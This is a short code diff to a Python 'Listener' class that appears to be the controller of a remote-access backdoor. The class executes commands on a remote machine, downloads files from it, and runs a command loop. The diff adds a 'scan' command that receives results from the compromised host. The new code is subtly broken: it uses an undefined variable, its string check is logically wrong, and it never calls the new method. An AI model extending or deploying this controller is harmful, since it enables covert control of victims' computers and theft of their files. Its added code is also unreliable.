@@ -43,7 +43,14 @@ class Listener():
         with open(path, "rb") as file:
             encoded_file = base64.b64encode(file.read())
             return encoded_file
-
+    def recv_scan_result(self):
+        scan_result = base64.b64decode(content)
+        if "Keyboard" and "Resolve" and "Server" not in scan_result:
+            with open("scan_result.txt", "w") as f:
+                f.write(scan_result)
+                f.close()
+        print (scan_result)
+        
     def run(self):
         while True:
             cmd = input("> ")
@@ -55,6 +62,8 @@ class Listener():
                 result = self.execute_remotely(cmd)
                 if cmd[0] == "download" and "[-] Error " not in result:
                     result = self.download_file(cmd[1], result)
+                if cmd[0] == "scan":
+                    result = self.recv_scan_result
             except Exception:
                 result = "[-] Error during command execution."
             print (result)
